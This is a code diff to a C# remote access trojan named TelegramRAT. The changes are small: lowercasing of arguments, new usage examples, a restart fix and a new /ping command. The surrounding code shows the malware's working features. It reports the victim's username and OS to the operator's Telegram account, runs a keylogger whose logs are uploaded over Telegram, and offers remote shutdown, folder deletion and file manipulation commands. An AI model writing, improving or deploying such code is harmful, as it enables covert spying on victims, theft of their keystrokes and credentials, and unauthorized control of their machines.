@@ -22,6 +22,7 @@ using AForge.Video;
 using AForge.Video.DirectShow;
 
 
+
 namespace TelegramRAT
 {
     public static class Program
@@ -41,8 +42,7 @@ namespace TelegramRAT
 
         static void Main(string[] args)
         {
-
-
+            
             string thisprocessname = Process.GetCurrentProcess().ProcessName;
 
             if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
@@ -67,6 +67,7 @@ namespace TelegramRAT
             {
                 Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                 Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
+                commands.Clear();
                 Main(args);
             }
         }
@@ -82,7 +83,7 @@ namespace TelegramRAT
 
         static async Task Run()
         {
-            var hellomsg = await Bot.SendTextMessageAsync(OwnerId,
+            Message hellomsg = await Bot.SendTextMessageAsync(OwnerId,
                 $"Computer online! \n\n" +
 
                 $"Username: <b>{Environment.UserName}</b>\n" +
@@ -91,11 +92,11 @@ namespace TelegramRAT
                 $"OS: {GetWindowsVersion()}",
                 ParseMode.Html);
 
-            var offset = 0;
+            int offset = 0;
 
             while (true)
             {
-                var updates = await Bot.GetUpdatesAsync(offset);
+                Update[] updates = await Bot.GetUpdatesAsync(offset);
                 if (updates.Length != 0)
                     offset = updates.Last().Id + 1;
 
@@ -537,15 +538,15 @@ namespace TelegramRAT
                 Command = "/power",
                 CountArgs = 1,
                 Description = "Switch PC power state. Usage:\n\n" +
-                "off - Turn PC off\n" +
-                "restart - Restart PC\n" +
-                "logoff - Log off system",
+                "Off - Turn PC off\n" +
+                "Restart - Restart PC\n" +
+                "LogOff - Log off system",
                 Example = "/power logoff",
                 Execute = (model, update) =>
                 {
                     try
                     {
-                        switch (model.Args[0])
+                        switch (model.Args[0].ToLower())
                         {
                             case "off":
                                 Process shutdown = new Process();
@@ -972,7 +973,7 @@ namespace TelegramRAT
                         try
                         {
                             IntPtr hWnd;
-                            if (model.Args[0] == "info" && model.Args.Length == 1)
+                            if (model.Args[0].ToLower() == "info" && model.Args.Length == 1)
                             {
                                 hWnd = WinAPI.GetForegroundWindow();
                                 Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
@@ -1002,7 +1003,7 @@ namespace TelegramRAT
                                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Window not found!", replyToMessageId: update.Message.MessageId);
                                     return;
                                 }
-                                switch (model.Args[0])
+                                switch (model.Args[0].ToLower())
                                 {
                                     case "info":
                                         Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
@@ -1177,6 +1178,8 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "/keylog",
+
+                Description = "Keylog starts and ends with no args.",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -1250,8 +1253,7 @@ namespace TelegramRAT
                             Bot.SendDocumentAsync(update.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
                         }
                     });
-                },
-                Description = "Keylog starts and ends with no args."
+                }
             });
 
             //RECORD AUDIO
@@ -1409,9 +1411,10 @@ namespace TelegramRAT
                 Command = "/deletefolder",
                 MayHaveNoArgs = false,
                 Description = "Delete folder.",
-                Execute = async (model, update) =>
+                Example = "/deletefolder C:\\Users\\User\\Desktop\\My Folder",
+                Execute = (model, update) =>
                 {
-                    await Task.Run(() =>
+                    Task.Run(() =>
                     {
                         try
                         {
@@ -1437,7 +1440,7 @@ namespace TelegramRAT
             {
                 Command = "/renamefile",
                 Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
-                Example = "/renamefile C:\\Users\\User\\Documents\\oldname.txt newname.txt",
+                Example = "/renamefile \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -1472,8 +1475,8 @@ namespace TelegramRAT
             {
                 Command = "/copyfile",
                 CountArgs = 2,
-                Description = "Copy file. First argument is file path (full or realtive), second is folder path",
-                Example = "/copyfile hello.txt C:\\Users\\User\\Documents",
+                Description = "Copy file. First argument is file path (full or realtive), second is folder path. Type paths as in cmd.",
+                Example = "/copyfile \"My folder\\hello world.txt\" \"C:\\Users\\User\\Documents\\Some Folder\"",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -1708,7 +1711,20 @@ namespace TelegramRAT
                 }
             });
 
-            
+            //PING 
+            CommandsList.Add(new BotCommand
+            {
+                Command = "/ping",
+
+                Description = "Ping bot to check if it's work",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Ping!", replyToMessageId: update.Message.MessageId); ;
+                    });
+                }
+            });
 
         }
     }
